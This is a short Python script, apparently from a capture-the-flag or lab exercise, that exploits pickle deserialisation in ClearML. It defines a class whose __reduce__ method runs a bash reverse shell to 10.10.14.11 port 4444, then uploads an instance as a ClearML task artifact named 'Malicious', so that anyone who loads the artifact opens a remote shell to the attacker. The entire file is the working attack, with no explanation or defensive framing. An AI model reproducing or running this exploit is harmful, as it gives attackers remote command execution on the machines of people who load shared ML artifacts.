from clearml import Task
import os

class RevShell():
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'",))
    
task = Task.init(project_name='Black Swan', task_name="MyTask", tags=['review'])
task.upload_artifact(name='Malicious', artifact_object=RevShell(), retries=2, wait_on_upload=True, extension_name='.plk')

